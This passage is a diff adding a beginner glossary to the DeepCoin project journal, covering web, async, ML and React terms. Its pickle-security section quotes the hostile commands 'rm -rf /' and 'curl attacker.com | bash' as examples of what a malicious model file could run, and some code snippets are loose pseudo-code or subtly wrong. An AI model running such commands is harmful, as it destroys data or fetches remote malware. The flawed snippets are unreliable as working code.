@@ -10409,3 +10409,2040 @@ cd frontend ; npx next build                          # 0 TS errors, 5 routes
 *Journal scope: Every commit. Every file. Every function. Every engineering decision.*
 *Total: ~10,000 lines. The complete technical memory of DeepCoin from day 1 to Layer 5.*
 
+
+---
+
+## Section 53  The Complete Baby Engineer's Reference: Every Term, Every Gap, Every Relationship
+
+This section exists because the previous sections were written by an engineer **for** an engineer.
+You are learning. Before you can understand WHY we made decisions, you need to understand
+WHAT we are talking about. This section defines every term that was used without enough explanation.
+
+Read this section like a dictionary: top-to-bottom once, then come back as a reference.
+
+---
+
+## PART 1  How the Internet Works (So HTTP, APIs, and REST Make Sense)
+
+---
+
+### What Is HTTP?
+
+HTTP stands for **HyperText Transfer Protocol**. It is the language that every browser
+and every web server use to talk to each other. Every time you open a webpage, your
+browser sends an HTTP message to a server. The server sends back an HTTP message with the page.
+
+Think of it like sending letters:
+- Your browser writes a letter (HTTP **request**): "Please send me the page at `/api/history`"
+- The server reads the letter and writes back an HTTP **response**: "Here are the 20 history items"
+
+An HTTP request has three parts:
+```
+1. METHOD + PATH:  GET /api/history
+   - Method: what you want to DO. GET = read. POST = create. DELETE = delete. PUT = replace.
+   - Path: what you are targeting. /api/history means "the history endpoint"
+
+2. HEADERS: key-value pairs  metadata about the request
+   Content-Type: application/json     "my request body is JSON"
+   X-API-Key: my-secret-key           "here is my authentication"
+   Accept: application/json           "I want the response as JSON"
+
+3. BODY (optional): the actual data
+   Only POST and PUT requests usually have a body.
+   GET and DELETE requests usually have no body.
+```
+
+An HTTP response has:
+```
+1. STATUS CODE: a 3-digit number saying what happened
+2. HEADERS: metadata (Content-Type, X-Request-ID, etc.)
+3. BODY: the actual returned data (JSON, HTML, a file, etc.)
+```
+
+---
+
+### HTTP Status Codes  The Complete Reference
+
+Every HTTP response starts with a 3-digit number. Here are all the ones DeepCoin uses:
+
+```
+200 OK              Everything worked. Response body has your data.
+                     Used by: GET /api/history, GET /api/health
+
+201 Created         Server created a new resource (not used in DeepCoin directly,
+                     but POST /classify implicitly creates a history record)
+
+204 No Content      Success, but there is nothing to return.
+                     Used by: DELETE /api/history/{id}
+                     WHY: When you delete something, there's nothing to show you.
+
+400 Bad Request     Your request was malformed. You made a mistake in the format.
+                     Example: passing a string where a number was expected.
+
+401 Unauthorized    "Who are you?" Authentication is missing or wrong.
+                     Used by: classify/metrics when DEEPCOIN_API_KEY is set and wrong key sent.
+                     CONFUSING NAME: It actually means "not authenticated" not "not authorized."
+
+403 Forbidden       "I know who you are, but you're not allowed."
+                     (Not used in DeepCoin but common in production systems)
+
+404 Not Found       The resource doesn't exist.
+                     Used by: GET /api/history/bad-id (if ID doesn't exist in SQLite)
+
+413 Content Too Large  The uploaded file exceeds the size limit (10 MB in DeepCoin).
+
+415 Unsupported Media Type  Wrong file type. You sent a PDF when only JPEG/PNG is accepted.
+
+422 Unprocessable Entity  Pydantic validation failed. Your JSON had the right structure
+                     but a field had the wrong type (e.g., confidence is "high" not a number).
+
+429 Too Many Requests  Rate limit hit. You've sent more than 10 classify requests per minute.
+                     slowapi automatically returns this.
+
+500 Internal Server Error  Something crashed on the server. Not your fault (usually).
+
+503 Service Unavailable  Server is running but not ready to serve (e.g., health check fails).
+                     DeepCoin returns 503 from /api/health when any component check fails.
+```
+
+**The pattern:**
+- 2xx = Success
+- 4xx = Client's fault (you sent something wrong)
+- 5xx = Server's fault (something broke on the server)
+
+---
+
+### What Is an API?
+
+**API** stands for **Application Programming Interface**.
+
+The word "interface" is key. Think of a USB port. You can plug any device into USB and it works
+because BOTH devices speak the same protocol. The USB protocol is an "interface"  a contract
+that defines how two things communicate.
+
+An API is the same idea but for software. FastAPI exposes a web API:
+- "Send a POST request to `/api/classify` with a file and TTA flag, and I'll return a JSON with the analysis"
+- That's the contract. Any client  web browser, mobile app, curl command, Python script  that
+  follows the contract gets the same result.
+
+**Endpoint** = one specific URL + method combination in an API.
+```
+POST /api/classify           one endpoint
+GET  /api/history            another endpoint
+GET  /api/history/{id}       another endpoint (parametrized with {id})
+DELETE /api/history/{id}     same URL, different method = different endpoint
+```
+
+**Route** = another word for endpoint. In FastAPI, you define routes with decorators:
+```python
+@app.get("/api/history")            this defines a GET route for /api/history
+async def list_history(): ...
+```
+
+---
+
+### What Is REST?
+
+**REST** stands for **Representational State Transfer**. It is a design style (not a protocol)
+for building APIs. When someone says "REST API" or "RESTful API," they mean an API that
+follows these principles:
+
+1. **Resources have URLs**: a coin analysis is a "resource" at `/api/history/{id}`.
+2. **HTTP methods express the action**:
+   - GET    = Read a resource
+   - POST   = Create a resource
+   - PUT    = Replace a resource completely
+   - PATCH  = Update part of a resource
+   - DELETE = Remove a resource
+3. **Stateless**: each request contains all information needed. The server doesn't remember
+   previous requests. Every request must include the API key.
+4. **Standard status codes**: use 200, 204, 404, etc. as described above.
+
+DeepCoin follows REST:
+```
+GET    /api/history         list analyses
+GET    /api/history/{id}    get one analysis
+DELETE /api/history/{id}    delete one analysis
+POST   /api/classify        create a new analysis
+```
+
+---
+
+### What Is JSON?
+
+**JSON** stands for **JavaScript Object Notation**. It is a text format for representing
+structured data. Looks like this:
+
+```json
+{
+  "label": "CN 1015",
+  "confidence": 0.9114,
+  "route_taken": "historian",
+  "top5": [
+    {"label": "CN 1015", "confidence": 0.9114},
+    {"label": "CN 3987", "confidence": 0.031}
+  ]
+}
+```
+
+Key rules:
+- Keys (left of colon) are always in double quotes: `"label"`
+- String values are in double quotes: `"CN 1015"`
+- Number values are bare: `0.9114`
+- Boolean: `true` or `false` (lowercase  NOT Python's `True`/`False`)
+- Null: `null` (NOT Python's `None`)
+- Arrays use `[]`: `[1, 2, 3]`
+- Objects use `{}`: `{"key": "value"}`
+
+**Serialization** = converting a Python object to JSON text (for sending over HTTP).
+**Deserialization** = converting JSON text back to a Python object (for processing).
+
+```python
+import json
+data = {"confidence": 0.91}
+text = json.dumps(data)      # serialization: dict  '{"confidence": 0.91}'
+back = json.loads(text)      # deserialization: '{"confidence": 0.91}'  dict
+```
+
+Pydantic's `.model_dump()` does serialization automatically in FastAPI routes.
+
+---
+
+### What Is CORS?
+
+**CORS** stands for **Cross-Origin Resource Sharing**.
+
+**Origin** = the combination of (protocol + domain + port).
+```
+http://localhost:3000     origin of the Next.js frontend
+http://localhost:8000     origin of the FastAPI backend
+```
+
+These are DIFFERENT origins (different port numbers).
+
+The **browser security rule**: By default, JavaScript running on `http://localhost:3000`
+is NOT allowed to make HTTP requests to `http://localhost:8000`. This rule is called the
+"Same-Origin Policy." It exists to protect users from malicious websites that could steal
+your bank data by secretly calling your bank's API.
+
+**The problem**: DeepCoin's frontend (port 3000) needs to call DeepCoin's backend (port 8000).
+Same developer, same machine, but browser blocks it because different ports = different origins.
+
+**CORS is the solution**: The server tells the browser "I ALLOW these origins to talk to me."
+```python
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["http://localhost:3000"],   #  explicit permission
+    allow_methods=["GET", "POST", "DELETE"],
+    allow_headers=["Content-Type", "X-API-Key"],
+)
+```
+The browser sends an OPTIONS "preflight" request first: "Can http://localhost:3000 reach you?"
+The server responds with the CORS headers saying "yes." Then the real request proceeds.
+Without CORS: the browser blocks the request before it even reaches your backend code.
+
+---
+
+### What Is ASGI?
+
+**ASGI** stands for **Asynchronous Server Gateway Interface**.
+
+When FastAPI runs, it needs a web server to handle the actual TCP connections (accepting
+incoming network bytes, parsing HTTP, sending bytes back). ASGI is the protocol that
+bridges Python web frameworks (FastAPI, Django, Starlette) with web servers (Uvicorn, Hypercorn).
+
+Think of it like a power socket standard. ASGI is the socket shape. FastAPI is the appliance.
+Uvicorn is the power outlet. Any ASGI-compatible framework works with any ASGI-compatible server.
+
+```
+Internet  Uvicorn (handles TCP, HTTP parsing)  ASGI interface  FastAPI (your routes)
+```
+
+When we say "X-Request-ID ASGI middleware," we mean middleware at the Uvicorn/Starlette level
+that intercepts EVERY request/response, even before FastAPI's route handlers.
+
+The ASGI interface passes three objects:
+- `scope`: metadata about the request (URL, method, headers)
+- `receive`: coroutine to read the request body
+- `send`: coroutine to write back the response
+
+---
+
+### What Is async/await? Event Loop? Coroutine?
+
+This is one of the most confusing concepts in modern Python. Here it is explained simply.
+
+**The problem async solves:**
+Imagine you're a waiter at a restaurant. You take Table 1's order, walk to the kitchen
+(takes 15 minutes to prepare), wait there doing nothing, then bring the food back.
+Meanwhile, Tables 2, 3, 4 are waiting with nobody to take their order. This is SYNCHRONOUS
+ one task fully blocks you while you wait.
+
+Async Python is like a smarter waiter: you take Table 1's order, submit it to the kitchen,
+and immediately go take Table 2's order. When Table 1's food is ready, you pick it up.
+Multiple tasks are in progress at the same time, but only one runs at any instant.
+
+**Event loop**: The restaurant manager who decides which task runs right now.
+One event loop. One thread. It alternates between tasks: "Table 1 is waiting for food,
+switch to Table 2. Table 2 ordered, switch to Table 3. Kitchen dinged  Table 1 is ready!"
+
+**Coroutine**: A function that can PAUSE itself and let the event loop run something else.
+```python
+async def serve_table(table_id):            # "async def" marks this as a coroutine
+    order = take_order(table_id)
+    food  = await kitchen.prepare(order)    # "await" = "I can pause here"
+    deliver(food, table_id)
+```
+`await kitchen.prepare(order)` says: "start preparing, but pause ME until it's done.
+While I'm paused, run something else." The event loop resumes this function when the kitchen is ready.
+
+**In DeepCoin:**
+```python
+@app.post("/api/classify")
+async def classify(upload: UploadFile):        # async route
+    data = await upload.read()                  # await = pause while reading file bytes
+    state = await asyncio.to_thread(gk.analyze, path)  # pause for 15 seconds of CNN/LLM
+    return ClassifyResponse(...)
+```
+While `gk.analyze` runs (15 seconds in a thread), the event loop is FREE to handle
+`GET /api/health`, `GET /api/history`, etc. The server never blocks.
+
+**thread vs coroutine:**
+- Coroutines run on ONE thread. They cooperatively yield control (via `await`).
+- Threads run on separate CPU contexts. The OS switches between them preemptively.
+
+`gk.analyze` uses PyTorch and is synchronous (no `await` inside). You CANNOT `await` a
+synchronous function. `asyncio.to_thread()` runs it in a real thread from the thread pool
+and wraps it as an awaitable. Best of both worlds: event loop stays responsive, heavy work
+runs in parallel.
+
+---
+
+### What Is thread-safe? What Is a Race Condition?
+
+**Thread-safe** means: "this code works correctly even when multiple threads call it simultaneously."
+
+**Race condition** = when the RESULT depends on which thread runs first. Unpredictable.
+
+Example (BAD  not thread-safe):
+```python
+count = 0
+
+def increment():
+    temp = count       # Thread A reads 0
+    temp = temp + 1    # Thread A computes 1
+    #  Thread B reads 0 here (hasn't been written yet!)
+    count = temp       # Thread A writes 1
+    # Thread B writes 1 (should have written 2!)
+
+# Two threads calling increment()  count ends up as 1 instead of 2
+```
+
+Example (GOOD  thread-safe with a lock):
+```python
+import threading
+count = 0
+lock = threading.Lock()
+
+def increment():
+    with lock:            # Only ONE thread can be inside here at a time
+        count += 1        # Safe: no other thread can interrupt
+```
+
+In DeepCoin, `_store.py` has a `threading.Lock()` protecting `append()` and `delete_by_id()`.
+The RAG engine singleton uses `threading.Lock()` for the `_engine_instance` check.
+The LLM client in `historian.py` uses `_llm_lock` so two simultaneous requests don't
+both try to initialize the Gemini client at the same time.
+
+---
+
+### Big O Notation: Why It Matters
+
+Big O notation describes how an algorithm's time or memory usage GROWS as the input size grows.
+
+`n` = the input size (number of records in the history table, for example).
+
+```
+O(1)      Constant. Same time regardless of n.
+            Example: reading one record by primary key in SQLite.
+
+O(log n)  Logarithmic. Time grows slowly even as n gets large.
+            Example: SQLite B-tree index lookup. 1 million records  only 20 comparisons.
+            WHY: B-tree splits the data in half at each step. Like binary search.
+
+O(n)      Linear. Time grows proportionally with n.
+            Example: loading ALL 10,000 history records to count them (old JSON approach).
+            10,000 records  10,000 units of work. 100,000 records  100,000 units.
+
+O(n log n)  Common for sorting. Python's sort() is O(n log n).
+
+O(n²)     Quadratic. Terrible. Avoid. A nested loop over n items.
+```
+
+**Why this matters in DeepCoin:**
+Old JSON approach: every history page view loaded ALL records into memory  O(n).
+New SQLite approach: `SELECT COUNT(*) FROM history` uses the B-tree  O(log n).
+At n=100 it doesn't matter. At n=100,000 records it's the difference between
+10ms and 100 seconds.
+
+---
+
+### What Is the Singleton Pattern?
+
+A singleton is a design pattern where a class has AT MOST ONE instance ever created.
+
+```python
+_instance = None
+_lock = threading.Lock()
+
+def get_engine():
+    global _instance
+    if _instance is None:                   # first check (no lock  fast path)
+        with _lock:                          # acquire lock
+            if _instance is None:            # second check (under lock  safe)
+                _instance = RAGEngine()      # ONLY created once
+    return _instance
+```
+
+**Why double-check?** Without the second check inside the lock:
+- Thread A sees `_instance is None`  waits for lock
+- Thread B sees `_instance is None`  gets lock, creates instance, releases lock
+- Thread A gets lock  `_instance` is now NOT None, but Thread A is already past the first check
+- Thread A creates a SECOND instance, overwriting the first
+
+The double-check lock pattern (DCL) prevents this. It's called "double-checked locking."
+
+**In DeepCoin:**
+- `get_rag_engine()` in `rag_engine.py`  singleton, thread-safe DCL
+- `get_gatekeeper()` in `gatekeeper.py`  singleton, stores the LangGraph compiled app
+- `limiter` in `limiter.py`  module-level singleton (simply defined once at import time)
+
+---
+
+### What Is the Repository Pattern?
+
+The Repository Pattern separates "how you store data" from "what the rest of the code does."
+
+Without Repository Pattern:
+```python
+# In classify.py:
+conn = sqlite3.connect("history.db")
+conn.execute("INSERT INTO history VALUES (?, ?, ...)", (...))
+# In history.py:
+conn = sqlite3.connect("history.db")
+rows = conn.execute("SELECT * FROM history LIMIT 20").fetchall()
+```
+If you switch from SQLite to PostgreSQL, you rewrite `classify.py` AND `history.py` AND
+every file that does SQL queries.
+
+With Repository Pattern:
+```python
+# _store.py defines the interface:
+def append(record: dict) -> None: ...   # insert one record
+def load_page(skip: int, limit: int) -> list: ...
+def delete_by_id(id: str) -> bool: ...
+
+# classify.py:
+from src.api._store import append
+append(record)              # doesn't know or care if it's SQLite or PostgreSQL
+
+# To switch to PostgreSQL: ONLY _store.py changes.
+# classify.py and history.py are unchanged.
+```
+
+---
+
+### What Is Python Pickle? And Why weights_only=True?
+
+**Pickle** is Python's built-in serialization format. It converts any Python object
+(function, class, lambda, dict, numpy array...) to bytes. Then you can save those bytes
+to a file and load them back.
+
+PyTorch uses pickle to save model weights with `torch.save(model.state_dict(), path)`.
+
+**The security problem:**
+When Python unpickles (loads) a file, it literally EXECUTES any code embedded in the file.
+A malicious actor can craft a `.pth` file that, when loaded with `torch.load(path)`,
+runs any arbitrary command on your machine:
+```
+rm -rf /  (delete everything!)
+curl attacker.com | bash  (download and run malware!)
+```
+
+This is a real published CVE attack. If you downloaded a "pretrained model" from the internet
+and loaded it without checking, your machine could be compromised.
+
+**`weights_only=True` is the fix:**
+```python
+# DANGEROUS:
+model = torch.load("best_model.pth")
+
+# SAFE:
+state_dict = torch.load("best_model.pth", weights_only=True)
+```
+
+`weights_only=True` tells PyTorch to use a restricted unpickler that ONLY loads tensor data.
+It refuses to execute any embedded code. If the file tries to run something, it raises an error.
+
+DeepCoin applies `weights_only=True` to every `torch.load()` call (both `inference.py` and `train.py`).
+
+---
+
+### What Is UUID?
+
+**UUID** stands for **Universally Unique Identifier**.
+
+A UUID looks like: `a1b2c3d4-e5f6-7890-abcd-ef1234567890`
+
+It's a 128-bit random number formatted as 32 hexadecimal characters with dashes.
+
+**Why use UUIDs instead of auto-incrementing integers (1, 2, 3, ...)?**
+
+If history records use IDs 1, 2, 3, ..., an attacker can guess that ID 5 exists and try to
+access `/api/history/5`. They can scrape ALL your history by trying IDs 1 through 1000.
+
+With UUIDs, the ID for each record is `e2a1f5b3-9c4d-4a2e-8f7b-1234567890ab`. Guessing this
+randomly is computationally impossible (2^122 possibilities). `uuid.uuid4()` generates a
+random UUID4 in Python.
+
+---
+
+## PART 2  AI and Machine Learning Terms Not in the Old Glossary
+
+---
+
+### What Is an Embedding / Vector?
+
+An **embedding** is a way to represent meaning as a list of numbers.
+
+Imagine you're trying to place words on a map based on their meaning:
+- "King" and "Queen" would be close together
+- "Apple" and "Fruit" would be close
+- "Car" and "Mango" would be far apart
+
+An embedding does exactly this, but in 384 dimensions instead of 2. Each word/sentence
+is converted to a list of 384 decimal numbers:
+
+```
+"Silver drachm from Maroneia"  [0.34, -0.12, 0.78, 0.01, ...]   384 numbers
+"Argentinian silver coin"      [0.33, -0.11, 0.76, 0.02, ...]   very similar numbers!
+"Bronze Byzantine follis"      [-0.42, 0.55, -0.23, 0.88, ...]   very different numbers
+```
+
+The model learns that similar meanings  similar numbers. This is how semantic search works:
+find the coin description whose numbers are closest to the query's numbers.
+
+**Dimension** = how many numbers in the list. `all-MiniLM-L6-v2` outputs 384 numbers per text.
+EfficientNet-B3 produces 1536 numbers per image (the coin's "visual fingerprint").
+
+**Why 384 and 1536 specifically?** Those are hyperparameters chosen by the model designers
+based on experiments. 384 is enough to capture text meaning without being wasteful. 1536
+was chosen for B3 based on the model's architecture.
+
+---
+
+### What Is RAG?
+
+**RAG** stands for **Retrieval-Augmented Generation**.
+
+The problem it solves: Large Language Models like Gemini were trained on data from before a
+certain date. They don't know about your specific 9,716 Corpus Nummorum coin types. If you
+ask "tell me about CN type 21027," the LLM would hallucinate (make up plausible-sounding
+but false historical facts).
+
+**RAG solution  three steps:**
+1. **Retrieve**: Search your database for relevant documents. "CN type 1015"  retrieve
+   the 5 text chunks about that coin from ChromaDB.
+2. **Augment**: Inject those retrieved documents into the LLM's input (the "prompt"):
+   ```
+   [CONTEXT 1  Identity] denomination: drachm | region: Thrace | date: 365-330 BC
+   [CONTEXT 2  Obverse] prancing horse right | legend MAR
+   INSTRUCTION: Using ONLY the context above, write a 3-paragraph analysis.
+   ```
+3. **Generate**: The LLM writes the narrative. But it's now ANCHORED to real facts.
+   It cannot invent a fact that isn't in the context (if you instruct it properly).
+
+RAG = LLM writes the PROSE, your database provides the FACTS.
+Without RAG: LLM invents facts. Historians would catch errors. System is unreliable.
+With RAG: Every fact is traceable to a specific context block. Zero hallucination on structured data.
+
+---
+
+### What Is a Chunk?
+
+In the context of knowledge bases and RAG, a **chunk** is one piece of a larger document
+that gets its own embedding vector.
+
+Old approach (one blob per coin):
+```
+"Type 1015. Denomination: drachm. Authority: Maroneia. Region: Thrace... [200 words]"
+  embed as ONE 384-dim vector
+```
+
+Problem: if you search "silver drachm material weight," the embedding of the 200-word blob
+contains ALL fields diluted together. The material information is buried.
+
+New approach (5 chunks per coin):
+```
+Chunk 1 (identity):  "type_id: 1015 | denomination: drachm | authority: Maroneia"
+Chunk 2 (obverse):   "obverse: prancing horse right | legend: MAR"
+Chunk 3 (reverse):   "reverse: bunch of grapes | legend: EPI ZINONOS"
+Chunk 4 (material):  "material: silver | weight: 2.44g | mint: Maroneia"
+Chunk 5 (context):   "persons: Magistrate Zenon | references: CN 1015"
+```
+Each chunk gets its own 384-dim vector. A search for "silver coin weight" matches Chunk 4
+directly. Much more precise retrieval.
+
+Total: 9,541 coins  5 chunks = 47,705 vectors in ChromaDB.
+
+---
+
+### What Is Temperature in LLMs?
+
+In a Large Language Model, **temperature** controls how "creative" or "random" the output is.
+
+LLMs produce probability distributions over possible next words. Temperature T modifies this:
+
+```
+T = 1.0  (neutral): use distribution as-is
+T > 1.0  (warm):    flatten distribution  more varied/creative/unpredictable output
+T < 1.0  (cold):    sharpen distribution  more focused/repetitive/predictable output
+T = 0.0  (frozen):  always pick the single highest-probability word  fully deterministic
+```
+
+**In DeepCoin  CNN temperature scaling (different concept, same word):**
+The CNN's softmax output can be overconfident on borderline coins. Temperature scaling T=1.4
+divides the raw logits (pre-softmax scores) by 1.4 before applying softmax:
+
+```python
+logits    = model(image)       # e.g. [8.3, 2.1, 1.5, ...]
+scaled    = logits / 1.4       # e.g. [5.93, 1.5, 1.07, ...]
+probs     = softmax(scaled)    # flatter distribution  more honest uncertainty
+```
+
+Why T=1.4 for DeepCoin: Coins photographed as screenshots (UI screenshots, scanned books)
+have different pixel statistics than trained-on coins. The CNN is overconfident on these.
+T=1.4 was calibrated empirically: it reduces false-high confidence without destroying
+accuracy on clean photographs.
+
+---
+
+### What Is a Prompt?
+
+A **prompt** is the text you send to an LLM as input. The LLM generates its response based
+on the entire prompt.
+
+In the historian agent, the prompt looks like:
+```
+You are an expert numismatist.
+
+[CONTEXT 1  Identity]
+denomination: drachm | authority: Maroneia | region: Thrace | date: c.365-330 BC
+
+[CONTEXT 2  Obverse]
+design: prancing horse right | legend: MAR
+
+[CONTEXT 3  Reverse]
+design: bunch of grapes on vine | legend: EPI ZINONOS
+
+[CONTEXT 4  Material]
+material: silver | weight: 2.44g | diameter: 14mm | mint: Maroneia
+
+[CONTEXT 5  Context]
+persons: Magistrate Zenon | references: Corpus Nummorum 1015
+
+INSTRUCTION: Using ONLY the facts in the contexts above (cite [CONTEXT N] for each claim),
+write a 3-paragraph professional numismatic analysis. Do not add any historical facts not
+present in the above contexts.
+```
+
+The LLM reads all of this and writes a professional analysis. The key is the instruction:
+"Using ONLY the facts above." This converts the LLM from a hallucination machine
+into a structured prose writer.
+
+**Token**: The unit of text the LLM processes. Roughly 1 token  0.75 English words.
+The prompt above might be 400 tokens. Gemini 2.5 Flash supports 1 million tokens as context.
+Our prompt + response = ~1,200 tokens. Well within the limit.
+
+**Context window**: The maximum number of tokens an LLM can process at once.
+If your prompt + expected response > context window, the LLM truncates the input.
+Our max_tokens=800 for the response means Gemini writes at most ~600 words.
+
+---
+
+### What Is HSV Color Space?
+
+Your monitor shows colors as combinations of Red, Green, Blue (RGB). RGB is good for
+displaying colors but terrible for DETECTING colors.
+
+Example: a coin that is gold looks different in different lighting:
+- Harsh light: RGB (220, 200, 80)
+- Soft light:  RGB (180, 160, 60)
+These are very different RGB values even though it's the same gold coin.
+
+**HSV** separates color information differently:
+- **H (Hue)**: The "type" of color. Pure red = 0°, yellow = 60°, green = 120°, blue = 240°.
+- **S (Saturation)**: How "pure" or "vivid" the color is. 0% = gray, 100% = fire-engine red.
+- **V (Value)**: How bright the color is. 0% = black, 100% = maximum brightness.
+
+In HSV, gold is ALWAYS H=15-35°, regardless of lighting intensity (V changes, H doesn't).
+This makes HSV ideal for detecting metals:
+```
+Gold coin:   H=15-35,  S=80-255  (warm yellow hue, vivid)
+Bronze coin: H=5-25,   S=50-180  (warm reddish-yellow, less vivid than gold)
+Silver coin: H=0-179,  S=0-40    (any hue but very low saturation = nearly gray)
+```
+
+The validator agent converts the coin image to HSV and creates masks for each metal.
+The mask is a black-and-white image where white = pixels matching the metal's HSV range.
+Count the white pixels. If >X% of the coin area is gold-colored  detected metal is gold.
+
+---
+
+### What Are Magic Bytes?
+
+**Magic bytes** are the first few bytes of a file that identify its format.
+
+Every file format was designed with a specific sequence of bytes at the very beginning
+that acts as a "signature." This is how your operating system knows what program to use
+when you double-click a file  it reads the first few bytes, not the extension.
+
+```
+JPEG starts with: FF D8 FF       (hexadecimal  always these exact 3 bytes)
+PNG starts with:  89 50 4E 47    (that's 89PNG in ASCII)
+PDF starts with:  25 50 44 46    (%PDF in ASCII)
+ZIP starts with:  50 4B 03 04    (PK..  Philip Katz, creator of ZIP)
+```
+
+In `classify.py`:
+```python
+_MAGIC = {
+    b"\xff\xd8\xff": "jpeg",
+    b"\x89PNG":      "png",
+}
+if not data[:4] in check against magic:
+    raise HTTPException(415)
+```
+
+An attacker could rename `malware.exe` to `coin.jpg`. The file extension is just text.
+But they CANNOT fake the magic bytes without making the file unreadable as a JPEG.
+Actually they CAN  a sophisticated attacker could prepend the valid JPEG magic bytes
+to a malicious payload. Magic byte checking is defense-in-depth, not a perfect security guarantee.
+Combined with server-side processing (OpenCV's `cv2.imdecode` will fail on non-images),
+the attack surface is greatly reduced.
+
+---
+
+### What Is the Sobel Operator?
+
+The Sobel operator detects **edges** in an image by computing the image gradient
+(how quickly pixel colors change from one pixel to the next).
+
+Think of a coin image: Areas with an inscription or relief have sharp transitions
+(dark background  bright raised edge  dark again). Areas with worn surfaces
+or flat fields have smooth gradients (gradual change from light to dark).
+
+**How it works:**
+```
+Sobel kernel (horizontal): [-1, 0, +1; -2, 0, +2; -1, 0, +1]
+Sobel kernel (vertical):   [-1, -2, -1; 0, 0, 0; +1, +2, +1]
+```
+Apply these 33 kernels to every pixel. The horizontal kernel detects vertical edges.
+The vertical kernel detects horizontal edges. Combine them (magnitude of the gradient vector).
+
+The result is a new image where bright pixels = sharp edges (well-preserved detail).
+Dark pixels = smooth areas (worn surface).
+
+**Sobel edge density** = count of pixels with edge strength > threshold / total pixels.
+A well-preserved coin: high edge density (many sharp details visible).
+A heavily worn coin: low edge density (the relief has been flattened by circulation).
+
+In `investigator.py`'s `_opencv_fallback()`:
+```python
+sobel_density = np.sum(edge_magnitude > 30) / total_pixels
+if sobel_density > 0.15:  condition = "well-preserved"
+elif sobel_density > 0.05: condition = "moderately worn"
+else:                       condition = "heavily worn"
+```
+
+---
+
+## PART 3  Web and Frontend Terms for New Engineers
+
+---
+
+### TypeScript vs JavaScript
+
+**JavaScript (JS)** = The original programming language of the web browser. Every browser
+can run JS code. If you load a webpage, the interactive parts (buttons, animations, form
+validation) are written in JavaScript.
+
+**TypeScript (TS)** = JavaScript with types added. It's a SUPERSET of JavaScript 
+every valid JavaScript file is also a valid TypeScript file.
+
+```javascript
+// JavaScript (no types  anything can be anything):
+function add(a, b) {
+    return a + b;
+}
+add("hello", 5)  // becomes "hello5"  probably a bug, no error
+```
+
+```typescript
+// TypeScript (with types  mistakes caught before running):
+function add(a: number, b: number): number {
+    return a + b;
+}
+add("hello", 5)  // TypeScript error at compile time: Argument of type 'string' is not assignable to parameter of type 'number'
+```
+
+TypeScript is compiled (transpiled) to JavaScript by the `tsc` compiler. The browser only
+runs the resulting JavaScript  it never sees TypeScript directly.
+
+**Why DeepCoin uses TypeScript for the frontend:**
+The `ClassifyResponse` from FastAPI has 20+ fields. Without TypeScript, if you mistype
+`response.cnn.confiddence` (double d), you get `undefined` at runtime with a confusing
+blank UI. With TypeScript, the compiler catches `confiddence` as an error before you even
+save the file.
+
+**TypeScript Interface** = a named type definition. Defines what shape an object must have.
+```typescript
+interface CnnResult {
+    class_id: number;
+    label: string;
+    confidence: number;
+    top5: Top5Item[];
+    vote_fraction: number | null;
+}
+```
+Now everywhere `CnnResult` is used, TypeScript enforces this exact shape.
+
+---
+
+### React: What Is a Component? What Does "Render" Mean?
+
+**Component** = a reusable piece of UI defined as a JavaScript/TypeScript function.
+```typescript
+function CoinBadge({ label, confidence }: Props) {
+    return (
+        <div className="badge">
+            <span>{label}</span>
+            <span>{(confidence * 100).toFixed(1)}%</span>
+        </div>
+    )
+}
+```
+This function returns JSX  a mix of HTML-like syntax and JavaScript expressions.
+`<div>`, `<span>` look like HTML but are actually JavaScript function calls.
+
+**Render** = the process of turning a component's JSX into actual DOM (HTML) elements
+that the browser displays. When you call `setCopied(true)`, React rerenders the component
+(calls the function again) and updates only the changed DOM elements.
+
+**"Rerender"** = running the component function again to update the UI. Rerenders are
+triggered by:
+- `useState` setter called (`setCopied(true)`)
+- Props changed (parent passes new data)
+- Context/Zustand state changed (subscribed value changed)
+
+React is smart: it only updates the DOM where it actually changed. This "diffing"
+(comparing old output vs new output) is the core algorithm of React.
+
+---
+
+### What Are Hooks?
+
+React **hooks** are special functions that let you "hook into" React features from
+a function component. Names always start with `use`.
+
+**`useState`**  local state for a component:
+```typescript
+const [copied, setCopied] = useState(false)
+// copied: current value (false)
+// setCopied: function to change the value  triggers rerender
+```
+
+**`useEffect`**  side effects (things outside React's tree):
+```typescript
+useEffect(() => {
+    const url = URL.createObjectURL(file)
+    setPreviewUrl(url)
+    return () => URL.revokeObjectURL(url)   // cleanup when component unmounts
+}, [file])                                   // only re-run when `file` changes
+```
+`useEffect` runs AFTER the component renders. The return function (cleanup) runs when
+the component is removed from the DOM (unmount) or before the effect re-runs.
+
+**`useMemo`**  memoize expensive computations:
+```typescript
+const filtered = useMemo(() =>
+    items.filter(i => i.label.includes(searchQuery)),
+[items, searchQuery])
+```
+Without `useMemo`: `filter()` runs on EVERY rerender (even if items and searchQuery haven't changed).
+With `useMemo`: only re-runs when `items` OR `searchQuery` changes. Cached otherwise.
+
+**`useCallback`**  memoize a function reference:
+Like `useMemo` but for functions. Prevents child components from rerendering when
+the parent creates a new function reference on every render.
+
+**`useRef`**  a mutable container that doesn't trigger rerenders:
+```typescript
+const abortRef = useRef<AbortController>(new AbortController())
+// abortRef.current = the AbortController
+// Changing abortRef.current does NOT cause a rerender
+```
+Used for: AbortController (you don't want UI updates when you cancel), DOM references,
+timer IDs, previous value storage.
+
+---
+
+### Prop Drilling: The Problem Zustand Solves
+
+**Props** = the data you pass from a parent component to a child component.
+```typescript
+<CoinBadge label="CN 1015" confidence={0.91} />
+```
+`label` and `confidence` are props.
+
+**Prop drilling** = passing data through many component layers just to reach one deep child.
+```
+App
+ AnalysisPage
+     ContentSection
+         ResultDisplay
+             CoinBadge    needs `confidenceTier`
+```
+Without a state manager, `confidenceTier` must be passed from `App` to `AnalysisPage`
+to `ContentSection` to `ResultDisplay` to `CoinBadge`. Every intermediate component
+receives a prop it doesn't use  just to pass it down. This is prop drilling.
+
+Zustand eliminates this: `CoinBadge` reads dirctly from the store:
+```typescript
+const confidence = useDeepCoinStore(s => s.result?.cnn.confidence)
+```
+No intermediate components involved.
+
+---
+
+### Server Component vs Client Component (Next.js App Router)
+
+This is a Next.js 13+ concept. It does NOT exist in older React frameworks.
+
+**Server Component** (default in App Router):
+- Runs on the server. The output is pure HTML sent to the browser.
+- Has access to: databases, file system, secrets, environment variables.
+- CANNOT: use useState, useEffect, browser APIs (window, document).
+- Produces zero JavaScript for the browser. Lighter page load.
+
+**Client Component** (opt-in with `"use client"`):
+- Runs in the browser (AND on the server during SSR  confusing!).
+- Has access to: browser APIs, React hooks, user interactions.
